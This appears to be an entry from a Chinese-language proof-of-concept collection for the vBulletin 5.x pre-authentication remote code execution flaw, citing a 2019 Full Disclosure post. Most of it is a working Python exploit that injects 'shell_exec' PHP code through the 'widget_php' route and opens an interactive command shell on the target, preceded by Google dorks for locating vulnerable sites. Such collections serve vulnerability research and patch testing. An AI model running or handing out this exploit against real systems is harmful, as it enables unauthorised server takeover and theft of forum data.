## 漏洞类型

- RCE

## 影响范围

5.x

## POC|EXP

```py
#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"
# 
# SUPPORT PY3 By d4m1ts

import requests
import sys

if len(sys.argv) != 2:
    sys.exit("Usage: %s <URL to vBulletin>" % sys.argv[0])

params = {"routestring":"ajax/render/widget_php"}

while True:
     try:
          cmd = input("vBulletin$ ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
          r = requests.post(url = sys.argv[1], data = params)
          if r.status_code == 200:
               print (r.text)
          else:
               sys.exit("Exploit failed! :(")
     except KeyboardInterrupt:
          sys.exit("\nClosing shell...")
     except Exception as e:
          sys.exit(str(e))
```

## 参考链接

> https://seclists.org/fulldisclosure/2019/Sep/31